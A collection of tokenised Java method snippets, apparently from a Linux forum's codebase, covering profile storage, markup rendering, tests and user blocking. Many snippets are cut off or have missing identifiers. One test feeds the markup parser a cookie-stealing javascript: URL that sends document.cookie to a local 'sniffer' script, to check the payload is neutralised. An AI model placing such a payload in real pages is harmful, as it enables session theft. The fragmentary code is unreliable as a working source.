private String buildTagUri ( String tag , int section , int offset ) { UriComponentsBuilder builder = UriComponentsBuilder . fromUri ( TAG_URI_TEMPLATE . expand ( tag ) ) ; if ( section ! = 0 ) { builder . queryParam ( " section " , section ) ; } if ( offset ! = 0 ) { builder . queryParam ( " offset " , offset ) ; } return builder . build ( ) . toUriString ( ) ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " tango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , true ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( SHOW_SOCIAL_PROPERTY , true ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); return defaults; } 
protected ModelAndView getData ( HttpServletRequest request ) throws Exception { List < TagDTO > list = tagDao . getTags ( TAGS_IN_CLOUD ) ; return new ModelAndView ( " boxlets/tagcloud " , " tags " , list ) ; } 
public static void setExpireHeaders ( HttpServletResponse response , Integer year , Integer month ) { if ( month = = null ) { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 1000 ) ; 
public int doStartTag ( ) throws JspException { JspWriter out = pageContext . getOut ( ) ; if ( list ! = null ) { try { StringBuilder buf = new StringBuilder ( ) ; for ( String el : list ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } if ( TagService . isGoodTag ( el ) ) { buf . append ( " <a class=tag rel=tag href= \" " ) . append ( TagTopicListController . tagListUrl ( el ) ) . append ( " \" > " ) . append ( StringUtil . escapeHtml ( el ) ) . append ( " </a> " ) ; } else { buf . append ( StringUtil . escapeHtml ( el ) ) ; } } out . append ( buf ) ; } catch ( IOException e ) { throw new JspException ( " Error: " + e . getMessage ( ) ) ; } } return SKIP_BODY ; } 
private ModelAndView redirectToListPage ( String tagName ) { char firstLetter = tagName . toLowerCase ( ) . charAt ( 0 ) ; String redirectUrl = TagTopicListController . tagsUrl ( firstLetter ) ; return new ModelAndView ( new RedirectView ( redirectUrl ) ) ; } 
public View tagFeedOld ( @RequestParam String tag ) { return new RedirectView ( TagTopicListController . tagListUrl ( tag ) ) ; } 
public String renderNodeXhtml ( Node node ) { if ( NodeUtils . isEmptyNode ( node ) ) { return " " ; } StringBuilder ret = new StringBuilder ( ) ; if ( node . isParameter ( ) ) { String lang = node . getParameter ( ) . trim ( ) ; if ( langHash . containsKey ( lang ) ) { ret . append ( " <div class= \" code \" ><pre class= \" " ) . append ( langHash . get ( lang ) ) . append ( " \" ><code> " ) ; } else { ret . append ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code> " ) ; } } else { ret . append ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code> " ) ; } ret . append ( node . renderChildrenXHtml ( ) ) ; ret . append ( " </code></pre></div> " ) ; return ret . toString ( ) ; } 
public String renderNodeXhtml ( Node node ) { if ( NodeUtils . isEmptyNode ( node ) ) { return " " ; } StringBuilder ret = new StringBuilder ( ) ; ret . append ( " <span class= \" code \" ><code> " ) . append ( node . renderChildrenXHtml ( ) ) . append ( " </span></code> " ) ; return ret . toString ( ) ; } 
public void testInCodeQuotes ( ) { assertEquals ( " <p>Smth about &#171;quotes&#187;? Look here: <div class= \" code \" ><pre class= \" no-highlight \" ><code>I love to eat &quot;white&quot; icecream</code></pre></div></p> " , 
public void testLocalBuffer ( ) { assertEquals ( " <p>This is simple &#171;local <u>buffer</u>&#187; test </p> " , 
public void makeTitle ( ) { given when String actualResult = StringUtil.makeTitle("\"Test of \"quotes '' \"in quotes\" in title\"\""); then Assert.assertEquals("&#171;Test of &#8222;quotes &quot; &#8222;in quotes&#8221; in title&#8221;&#187;", actualResult); } 
public void urlEscapeTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false , false ) ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&#171;http:127.0.0.1/sniffer.pl?&#187;+document.cookie;close()</s></p> " , lorCodeService . parseComment ( " [url]javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()[/url] " , false , false ) ) ; 
public List < PreparedGalleryItem > prepare ( List < GalleryItem > items ) { String htmlPath = configuration . getHTMLPathPrefix ( ) ; ImmutableList . Builder < PreparedGalleryItem > builder = ImmutableList . builder ( ) ; for ( GalleryItem item : items ) { try { ImageInfo iconInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getIcon ( ) ) ; ImageInfo fullInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getOriginal ( ) ) ; builder . add ( new PreparedGalleryItem ( item , userDao . getUserCached ( item . getUserid ( ) ) , iconInfo , fullInfo ) ) ; } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } catch ( FileNotFoundException e ) { logger . error ( " Image not found! id={}: {} " , item . getImage ( ) . getId ( ) , e . getMessage ( ) ) ; } catch ( BadImageException | IOException e ) { logger . error ( " Bad image id={} " , item . getImage ( ) . getId ( ) , e ) ; } } return builder . build ( ) ; } 
public UserDetails loadUserByUsername ( String username ) throws UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , true ) ; if ( user = = null ) { throw new UsernameNotFoundException ( username ) ; } } else { try { user = userDao . getUser ( username ) ; userDao . updateLastlogin ( user , false ) ; } catch ( UserNotFoundException e ) { throw new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , profileDao . readProfile ( user ) ) ; } 
public Profile readProfile ( @NotNull User user ) { Storage storage = new FileStorage ( configuration . getPathPrefix ( ) + " linux-storage/ " ) ; InputStream df = null ; Map < String , Object > userProfile = null ; try { df = storage . getReadStream ( " profile " , user . getNick ( ) ) ; ObjectInputStream dof = null ; try { dof = new ObjectInputStream ( df ) ; userProfile = ( Map < String , Object > ) dof . readObject ( ) ; dof . close ( ) ; df . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } finally { if ( dof ! = null ) { try { dof . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } } } } catch ( StorageException | ClassNotFoundException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } finally { if ( df ! = null ) { try { df . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } } } ProfileProperties properties ; if ( userProfile ! = null ) { properties = new ProfileProperties ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , userProfile ) ) ; } else { properties = new ProfileProperties ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < String , Object > ( ) ) ) ; } return new Profile ( properties , false ) ; } 
public void writeProfile ( @NotNull User user , Profile profile ) throws IOException , StorageException { ProfileHashtable profileHashtable = profile . getProperties ( ) . getHashtable ( ) ; profileHashtable . setObject ( ProfileProperties . TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; Storage storage = new FileStorage ( configuration . getPathPrefix ( ) + " linux-storage/ " ) ; OutputStream df = storage . getWriteStream ( " profile " , user . getNick ( ) ) ; try ( ObjectOutputStream dof = new ObjectOutputStream ( df ) ) { dof . writeObject ( profileHashtable . getSettings ( ) ) ; 
private static String fixFormat ( String mode ) { if ( ! " quot " . equals ( mode ) & & ! " ntobr " . equals ( mode ) & & ! " lorcode " . equals ( mode ) ) { return ( String ) AuthUtil . getDefaults ( ) . get ( " format.mode " ) ; } return mode ; } 
private static String fixStyle ( String style ) { if ( ! DefaultProfile . isStyle ( style ) ) { return ( String ) AuthUtil . getDefaults ( ) . get ( STYLE_PROPERTY ) ; } return style ; } 
public void initTestUser ( ) { testUser = mock ( User . class ) ; when ( testUser . getNick ( ) ) . thenReturn ( " test-user " ) ; } 
public void testDefaultProfileSave ( ) throws Exception { Profile profile = new Profile ( ) ; profileDao . writeProfile ( testUser , profile ) ; Profile profile1 = profileDao . readProfile ( testUser ) ; assertFalse ( profile1 . isDefault ( ) ) ; } 
public void estModification ( ) throws Exception { Profile profile = new Profile ( ) ; assertNotSame ( 125 , profile . getProperties ( ) . getMessages ( ) ) ; profile . getProperties ( ) . setMessages ( 125 ) ; profileDao . writeProfile ( testUser , profile ) ; Profile profile1 = profileDao . readProfile ( testUser ) ; assertEquals ( 125 , profile1 . getProperties ( ) . getMessages ( ) ) ; } 
public void createTempDir ( ) throws IOException { tempDir = Files . createTempDir ( ) ; Files . createParentDirs ( new File ( tempDir , " linux-storage/profile/test " ) ) ; } 
public void dropTempDir ( ) throws IOException { FileUtils . deleteDirectory ( tempDir ) ; } 
public ProfileDao profileDao ( ) { return new ProfileDao ( ) ; } 
public ru . org . linux . spring . Configuration configuration ( ) { ru . org . linux . spring . Configuration mock = mock ( ru . org . linux . spring . Configuration . class ) ; when ( mock . getPathPrefix ( ) ) . thenReturn ( tempDir . getAbsolutePath ( ) + '/' ) ; return mock ; } 
public Properties properties ( ) { return new Properties ( ) ; } 
public Map < String , Object > getComments ( @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " page " , defaultValue = " 0 " ) int page , HttpServletRequest request ) throws Exception { Topic topic = topicDao . getById ( msgid ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; if ( ! section . getUrlName ( ) . equals ( sectionName ) | | ! group . getUrlName ( ) . equals ( groupName ) | | page < 0 ) { throw new MessageNotFoundException ( msgid ) ; } permissionService . checkView ( topic , AuthUtil . getCurrentUser ( ) ) ; CommentList comments = commentService . getCommentList ( topic , false ) ; CommentFilter cv = new CommentFilter ( comments ) ; int messagesPerPage = AuthUtil . getProfile ( ) . getMessages ( ) ; List < Comment > commentsFiltered = cv . getCommentsForPage ( false , page , messagesPerPage , ImmutableSet . < Integer > of ( ) ) ; List < PreparedComment > preparedComments = prepareService . prepareCommentList ( comments , commentsFiltered , request . isSecure ( ) , Template . getTemplate ( request ) , topic ) ; return ImmutableMap . of ( " comments " , preparedComments , 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , Profile profile , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , String > tags = messageDao . getTags ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , tags . get ( message . getId ( ) ) , true , null , secure , user , textMap . get ( message . getId ( ) ) , null ) ; TopicMenu topicMenu = getTopicMenu ( preparedMessage , user , secure , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , Profile profile , boolean loadUserpics ) { boolean topicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean tagsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; int memoriesId ; int favsId ; boolean deletable ; List < Integer > topicStats = memoriesDao . getTopicStats ( message . getMessage ( ) . getId ( ) ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; memoriesId = memoriesDao . getId ( currentUser , message . getMessage ( ) , true ) ; favsId = memoriesDao . getId ( currentUser , message . getMessage ( ) , false ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; memoriesId = 0 ; favsId = 0 ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { String avatarMode = profile . getAvatarMode ( ) ; if ( " empty " . equals ( avatarMode ) ) { avatarMode = " mm " ; } userpic = userService . getUserpic ( message . getAuthor ( ) , secure , avatarMode ) ; } return new TopicMenu ( topicEditable , 
public static Profile createDefault ( ) { return new Profile ( new ProfileHashtable ( AuthUtil . getDefaults ( ) , new HashMap < String , Object > ( ) ) ) ; } 
public Profile readProfile ( @NotNull User user ) { Storage storage = new FileStorage ( configuration . getPathPrefix ( ) + " linux-storage/ " ) ; InputStream df = null ; Map < String , Object > userProfile = null ; try { df = storage . getReadStream ( " profile " , user . getNick ( ) ) ; ObjectInputStream dof = null ; try { dof = new ObjectInputStream ( df ) ; userProfile = ( Map < String , Object > ) dof . readObject ( ) ; dof . close ( ) ; df . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } finally { if ( dof ! = null ) { try { dof . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } } } } catch ( StorageException | ClassNotFoundException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } finally { if ( df ! = null ) { try { df . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } } } Profile properties ; if ( userProfile ! = null ) { properties = new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , userProfile ) ) ; } else { properties = new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < String , Object > ( ) ) ) ; } return properties ; } 
public void writeProfile ( @Nonnull User user , @Nonnull Profile profile ) throws IOException , StorageException { ProfileHashtable profileHashtable = profile . getHashtable ( ) ; profileHashtable . setObject ( Profile . TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; Storage storage = new FileStorage ( configuration . getPathPrefix ( ) + " linux-storage/ " ) ; OutputStream df = storage . getWriteStream ( " profile " , user . getNick ( ) ) ; try ( ObjectOutputStream dof = new ObjectOutputStream ( df ) ) { dof . writeObject ( profileHashtable . getSettings ( ) ) ; 
public void estModification ( ) throws Exception { Profile profile = Profile . createDefault ( ) ; assertNotSame ( 125 , profile . getMessages ( ) ) ; profile . setMessages ( 125 ) ; profileDao . writeProfile ( testUser , profile ) ; Profile profile1 = profileDao . readProfile ( testUser ) ; assertEquals ( 125 , profile1 . getMessages ( ) ) ; } 
public void testMain ( ) throws IOException { ClientResponse cr = resource . path ( " / " ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; } 
public void testMain ( ) throws IOException { ClientResponse cr = resource . path ( " /news/archive/2007/5 " ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; } 
public int doStartTag ( ) throws JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; List < String > boxnames = . getProf ( ) . getBoxlets ( ) ; CollectionUtils . filter ( boxnames , new Predicate ( ) { @Override public boolean evaluate ( Object o ) { String s = ( String ) o ; return DefaultProfile . isBox ( s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " tango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , true ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( SHOW_SOCIAL_PROPERTY , true ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); return defaults; } 
public static Profile createDefault ( ) { return new Profile ( new ProfileHashtable ( AuthUtil . getDefaults ( ) , new HashMap < String , String > ( ) ) , null ) ; } 
public Profile readProfile ( @NotNull User user ) { List < Profile > profiles = jdbcTemplate . query ( " SELECT settings, main FROM user_settings WHERE id=? " , new RowMapper < Profile > ( ) { @Override public Profile mapRow ( ResultSet resultSet , int i ) throws SQLException { Array boxes = resultSet . getArray ( " main " ) ; if ( boxes ! = null ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , Arrays . asList ( ( String [ ] ) boxes . getArray ( ) ) ) ; } else { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , null ) ; } } } , user . getId ( ) ) ; if ( profiles . isEmpty ( ) ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < String , String > ( ) ) , null ) ; 
public Profile mapRow ( ResultSet resultSet , int i ) throws SQLException { Array boxes = resultSet . getArray ( " main " ) ; if ( boxes ! = null ) { return new Profile ( 
public void deleteProfile ( @Nonnull User user ) { jdbcTemplate . update ( " DELETE FROM user_settings WHERE id=? " , user . getId ( ) ) ; } 
public void writeProfile ( @Nonnull final User user , @Nonnull final Profile profile ) { String boxlets [ ] = null ; List < String > customBoxlets = profile . getCustomBoxlets ( ) ; if ( customBoxlets ! = null ) { boxlets = customBoxlets . toArray ( new String [ customBoxlets . size ( ) ] ) ; } final String [ ] finalBoxlets = boxlets ; if ( jdbcTemplate . update ( new PreparedStatementCreator ( ) { 
public PreparedStatement createPreparedStatement ( Connection con ) throws SQLException { PreparedStatement st = con . prepareStatement ( " UPDATE user_settings SET settings=?, main=? WHERE id=? " ) ; st . setObject ( 1 , profile . getSettings ( ) ) ; if ( finalBoxlets ! = null ) { st . setArray ( 2 , con . createArrayOf ( " text " , finalBoxlets ) ) ; } else { st . setNull ( 2 , Types . ARRAY ) ; } st . setInt ( 3 , user . getId ( ) ) ; return st ; } 
public PreparedStatement createPreparedStatement ( Connection con ) throws SQLException { PreparedStatement st = con . prepareStatement ( " INSERT INTO user_settings (id, settings, main) VALUES (?,?,?g) " ) ; st . setInt ( 1 , user . getId ( ) ) ; st . setObject ( 2 , profile . getSettings ( ) ) ; if ( finalBoxlets ! = null ) { st . setArray ( 3 , con . createArrayOf ( " text " , finalBoxlets ) ) ; } else { st . setNull ( 3 , Types . ARRAY ) ; } return st ; } 
public void initTestUser ( ) { testUser = mock ( User . class ) ; when ( testUser . getId ( ) ) . thenReturn ( 1 ) ; } 
public void estModification ( ) throws Exception { Profile profile = Profile . createDefault ( ) ; assertNotSame ( 125 , profile . getMessages ( ) ) ; profile . setMessages ( 125 ) ; profileDao . writeProfile ( testUser , profile ) ; Profile profile1 = profileDao . readProfile ( testUser ) ; profileDao . deleteProfile ( testUser ) ; assertEquals ( 125 , profile1 . getMessages ( ) ) ; assertNull ( profile1 . getCustomBoxlets ( ) ) ; } 
private void rawPushTextNode ( ParserAutomatonState automatonState , Node currentNode , String text ) { if ( ! automatonState . isCode ( ) ) { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , parserParameters , text , automatonState ) ) ; 
public String format ( String text , boolean secure , boolean nofollow ) { return format ( text , secure , nofollow , null ) ; } 
public String format ( String text , boolean secure , boolean nofollow , RuTypoChanger changer ) { String escapedText = StringUtil . escapeHtml ( text ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String token = st . nextToken ( ) ; String formattedToken = formatURL ( token , secure , nofollow , changer ) ; sb . append ( formattedToken ) ; } return sb . toString ( ) . replaceAll ( MDASH_REGEX , MDASH_REPLACE ) ; } 
private String formatWithMagic ( String text , RuTypoChanger changer ) { String text2 = changer ! = null ? changer . format ( text ) : text ; return text2 ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new CommentRequestValidator ( lorCodeService ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean isEmptyTextComment ( String msg ) { return parseForOgDescription ( msg . trim ( ) ) . isEmpty ( ) ; } 
public PreparedStatement createPreparedStatement ( Connection con ) throws SQLException { PreparedStatement st = con . prepareStatement ( " INSERT INTO user_settings (id, settings, main) VALUES (?,?,?) " ) ; st . setInt ( 1 , user . getId ( ) ) ; st . setObject ( 2 , profile . getSettings ( ) ) ; if ( finalBoxlets ! = null ) { st . setArray ( 3 , con . createArrayOf ( " text " , finalBoxlets ) ) ; } else { st . setNull ( 3 , Types . ARRAY ) ; } return st ; } 
public void testReadEmpty ( ) throws Exception { profileDao . deleteProfile ( testUser ) ; Profile profile = profileDao . readProfile ( testUser ) ; assertNull ( profile . getCustomBoxlets ( ) ) ; } 
public void testEmpty ( ) { assertTrue ( lorCodeService . isEmptyTextComment ( " [br] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [br] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [b] [br][/b][u] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [list][*][br][br][*][u][/u][/list] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [url] [/url][list][*][br][br][*][u][/u][/list][/url] " ) ) ; } 
public boolean apply ( String s ) { return DefaultProfile . isBox ( s ) ; } 
public static Predicate < String > boxPredicate ( ) { return isBoxPredicate ; } 
public int doStartTag ( ) throws JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; List < String > boxnames = ImmutableList . copyOf ( Iterables . filter ( . getProf ( ) . getBoxlets ( ) , DefaultProfile . boxPredicate ( ) ) ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public String renderOg ( ) { return StringUtil . escapeForceHtml ( text ) ; } 
public void testOg ( ) { assertEquals ( " hello " , lorCodeService . parseForOgDescription ( " hello " ) ) ; assertEquals ( " one crap two three " , lorCodeService . parseForOgDescription ( " [list] " + " [*]one " + '' + " crap " + " [*]two " + " [*]three " + " [/list] " ) ) ; assertEquals ( " due one teo neo wuf? nok " , lorCodeService . parseForOgDescription ( " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " ) ) ; assertEquals ( " &amp;#9618; " , lorCodeService . parseForOgDescription ( " [code]&#9618;[/code] " ) ) ; String txt = " many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b] " ; assertEquals ( " many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many t... " , lorCodeService . parseForOgDescription ( txt ) ) ; assertEquals ( 250 + 3 , 
public void testEmpty ( ) { assertTrue ( lorCodeService . isEmptyTextComment ( " [br] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [br] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [b] [br][/b][u] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [list][*][br][br][*][u][/u][/list] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [url] [/url][list][*][br][br][*][u][/u][/list][/url] " ) ) ; assertFalse ( lorCodeService . isEmptyTextComment ( " [code]text[/code] " ) ) ; } 
public void logResetUserpic ( User user , User actionUser , int bonus ) { ImmutableMap < String , Object > options ; if ( bonus ! = 0 ) { options = ImmutableMap . < String , Object > of ( " bonus " , bonus , " old_userpic " , user . getPhoto ( ) ) ; } else { options = ImmutableMap . < String , Object > of ( " old_userpic " , user . getPhoto ( ) ) ; } jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public UserLogDao userLogDao ( ) { return new UserLogDao ( ) ; } 
public ImageDao imageDao ( ) { return new ImageDao ( ) ; } 
public SectionService sectionService ( ) { return new SectionService ( ) ; } 
public SectionDao sectionDao ( ) { return new SectionDaoImpl ( ) ; } 
public UserLogDao userLogDao ( ) { return mock ( UserLogDao . class ) ; } 
public IgnoreListDao ignoreListDao ( ) { return mock ( IgnoreListDao . class ) ; } 
public UserTagDao userTagDao ( ) { return new UserTagDao ( ) ; } 
public void logResetUserpic ( @Nonnull User user , @Nonnull User actionUser , int bonus ) { ImmutableMap < String , Object > options ; if ( bonus ! = 0 ) { options = ImmutableMap . < String , Object > of ( " bonus " , bonus , OPTION_OLD_USERPIC , user . getPhoto ( ) ) ; } else { options = ImmutableMap . < String , Object > of ( " old_userpic " , user . getPhoto ( ) ) ; } jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public DeleteCommentResult deleteAllCommentsAndBlock ( User user , final User moderator , String reason ) { userDao . block ( user , moderator , reason ) ; List < Integer > deletedTopicIds = messageDao . deleteAllByUser ( user , moderator ) ; List < Integer > deletedCommentIds = commentDao . deleteAllByUser ( user , moderator ) ; return new DeleteCommentResult ( deletedTopicIds , deletedCommentIds , null ) ; } 
public void testBlock ( ) throws UserNotFoundException { User user = userDao . getUser ( TEST_ID ) ; userDao . block ( user , user , " " ) ; User userAfter = userDao . getUser ( TEST_ID ) ; assertTrue ( userAfter . isBlocked ( ) ) ; } 
public void testCacheResetOnBlock ( ) throws UserNotFoundException { User user = userDao . getUser ( TEST_ID ) ; userDao . block ( user , user , " " ) ; User userAfter = userDao . getUserCached ( TEST_ID ) ; assertTrue ( userAfter . isBlocked ( ) ) ; } 
public void block ( @Nonnull User user , @Nonnull User moderator , @Nonnull String reason ) { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; userLogDao . logBlockUser ( user , moderator , reason ) ; } 
public void unblock ( @Nonnull User user , @Nonnull User moderator ) { jdbcTemplate . update ( " UPDATE users SET blocked='f' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " DELETE FROM ban_info WHERE userid=? " , user . getId ( ) ) ; userLogDao . logUnblockUser ( user , moderator ) ; } 
public void logBlockUser ( @Nonnull User user , @Nonnull User moderator , @Nonnull String reason ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public void logUnblockUser ( @Nonnull User user , @Nonnull User moderator ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
private void rescueJB ( ) throws Exception { final User user = userDao . getUser ( " JB " ) ; userDao . unblock ( user , user ) ; } 
private void rescueJB ( ) throws Exception { final User user = userDao . getUser ( " JB " ) ; userDao . updateUser ( user , JB_NAME , JB_URL , JB_EMAIL , JB_TOWN , JB_PASS , JB_INFO ) ; userDao . acceptNewEmail ( user ) ; userDao . unblock ( user , user ) ; } 
public ModelAndView activate ( HttpServletRequest request , @RequestParam String activation ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized! " ) ; } User user = tmpl . getCurrentUser ( ) ; String newEmail = userDao . getNewEmail ( user ) ; if ( newEmail = = null ) { throw new AccessViolationException ( " new_email == null?! " ) ; } String regcode = user . getActivationCode ( configuration . getSecret ( ) , newEmail ) ; if ( ! regcode . equals ( activation ) ) { throw new AccessViolationException ( " Bad activation code " ) ; } userDao . acceptNewEmail ( user , newEmail ) ; return new ModelAndView ( new RedirectView ( " /people/ " + user . getNick ( ) + " /profile " ) ) ; } 
